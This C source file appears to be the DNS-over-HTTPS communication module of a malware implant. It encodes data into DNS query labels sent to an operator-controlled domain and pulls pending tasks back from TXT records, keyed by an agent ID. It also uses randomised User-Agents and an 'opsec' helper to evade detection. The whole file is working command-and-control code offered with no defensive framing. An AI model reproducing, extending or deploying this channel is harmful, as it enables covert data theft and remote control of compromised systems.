#include "channels.h"
#include "util.h"
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef CURLSSLOPT_NATIVE_CA
#define CURLSSLOPT_NATIVE_CA (1<<4)
#endif

/* accumulates HTTP response data */

typedef struct {
    char  *data;
    size_t len;
} curl_buf_t;

static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    curl_buf_t *buf = (curl_buf_t *)userdata;
    size_t      nb  = size * nmemb;
    char       *tmp = realloc(buf->data, buf->len + nb + 1);
    if (!tmp) return 0;
    buf->data = tmp;
    memcpy(buf->data + buf->len, ptr, nb);
    buf->len += nb;
    buf->data[buf->len] = '\0';
    return nb;
}

/* send a DoH TXT query, return raw JSON response */

static char *doh_query_txt(const char *doh_server, const char *fqdn)
{
    char url[512];
    snprintf(url, sizeof(url), "%s?name=%s&type=TXT", doh_server, fqdn);

    CURL      *curl = curl_easy_init();
    if (!curl) return NULL;

    curl_buf_t resp = {0};

    char ua_hdr[320];
    snprintf(ua_hdr, sizeof(ua_hdr), "User-Agent: %s", random_ua());

    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Accept: application/dns-json");
    hdrs = curl_slist_append(hdrs, ua_hdr);

    curl_apply_opsec(curl);
    curl_easy_setopt(curl, CURLOPT_URL,           url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER,    hdrs);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA,     &resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT,       15L);

    CURLcode res  = curl_easy_perform(curl);
    long     code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || code != 200) {
        free(resp.data);
        return NULL;
    }
    return resp.data;
}

static char *doh_extract_txt(const char *response)
{
    /* Find first "type":16 entry */
    const char *p = response;
    while ((p = strstr(p, "\"type\":16")) != NULL) {
        const char *d = strstr(p, "\"data\"");
        if (!d) break;
        d += strlen("\"data\"");
        while (*d == ' ' || *d == ':') d++;
        if (*d != '"') { p++; continue; }
        d++;

        /* TXT data may be wrapped in extra quotes: "\"value\"" */
        if (*d == '\\' && *(d+1) == '"') d += 2;

        size_t i = 0, cap = 2048;
        char *out = malloc(cap);
        if (!out) return NULL;
        while (*d && *d != '"') {
            if (*d == '\\' && *(d+1) == '"') { /* closing escaped quote */ break; }
            if (i + 2 >= cap) {
                cap *= 2;
                char *tmp = realloc(out, cap);
                if (!tmp) { free(out); return NULL; }
                out = tmp;
            }
            out[i++] = *d++;
        }
        out[i] = '\0';
        if (i == 0) { free(out); p++; continue; }
        return out;
    }
    return NULL;
}

/* base32 encoding for valid DNS labels */

static const char B32_ALPHABET[] = "abcdefghijklmnopqrstuvwxyz234567";

static size_t b32_encode(const uint8_t *in, size_t in_len, char *out)
{
    size_t i = 0, j = 0;
    uint32_t acc = 0;
    int      bits = 0;

    for (i = 0; i < in_len; i++) {
        acc = (acc << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[j++] = B32_ALPHABET[(acc >> bits) & 0x1F];
        }
    }
    if (bits > 0)
        out[j++] = B32_ALPHABET[(acc << (5 - bits)) & 0x1F];
    out[j] = '\0';
    return j;
}

/* derive send/recv labels from the first/last 4 chars of agent_id */

static void doh_get_labels(const char *agent_id, char *send_lbl, char *recv_lbl)
{

    send_lbl[0] = agent_id[0]; send_lbl[1] = agent_id[1];
    send_lbl[2] = agent_id[2]; send_lbl[3] = agent_id[3];
    send_lbl[4] = '\0';

    recv_lbl[0] = agent_id[4]; recv_lbl[1] = agent_id[5];
    recv_lbl[2] = agent_id[6]; recv_lbl[3] = agent_id[7];
    recv_lbl[4] = '\0';
}

/* split b64 payload into DNS TXT queries */

#define DOH_CHUNK_BYTES 30

int doh_send(const channel_config_t *cfg, const char *agent_id, const char *b64)
{
    if (!cfg->doh_domain[0]) return CHANNEL_ERR;

    char send_lbl[8], recv_lbl[8];
    doh_get_labels(agent_id, send_lbl, recv_lbl);

    size_t b64_len = strlen(b64);
    size_t offset  = 0;
    int    seq     = 0;
    int    ok      = 1;

    while (offset < b64_len) {
        size_t chunk = b64_len - offset;
        if (chunk > DOH_CHUNK_BYTES) chunk = DOH_CHUNK_BYTES;

        char b32_label[64];
        b32_encode((const uint8_t *)b64 + offset, chunk, b32_label);

        char fqdn[256];
        snprintf(fqdn, sizeof(fqdn), "%s.%02d.%s.%s.%s",
                 b32_label, seq, send_lbl, agent_id, cfg->doh_domain);

        char *resp = doh_query_txt(cfg->doh_server, fqdn);
        if (resp) free(resp);
        else { ok = 0; }

        offset += chunk;
        seq++;
    }

    /* end-of-stream marker */
    char fqdn_done[256];
    snprintf(fqdn_done, sizeof(fqdn_done), "%s.%02d.%s.%s.%s",
             send_lbl, seq, send_lbl, agent_id, cfg->doh_domain);
    char *resp = doh_query_txt(cfg->doh_server, fqdn_done);
    if (resp) free(resp);

    return ok ? CHANNEL_OK : CHANNEL_RETRY;
}

/* fetch pending task from a TXT DNS record */

char *doh_recv(const channel_config_t *cfg, const char *agent_id)
{
    if (!cfg->doh_domain[0]) return NULL;

    char send_lbl[8], recv_lbl[8];
    doh_get_labels(agent_id, send_lbl, recv_lbl);

    char fqdn[256];
    snprintf(fqdn, sizeof(fqdn), "%s.%s.%s", recv_lbl, agent_id, cfg->doh_domain);

    char *resp = doh_query_txt(cfg->doh_server, fqdn);
    if (!resp) return NULL;

    char *txt = doh_extract_txt(resp);
    free(resp);

    /* Empty or "null" = no pending task */
    if (txt && (txt[0] == '\0' || strcmp(txt, "null") == 0)) {
        free(txt);
        return NULL;
    }
    return txt;
}
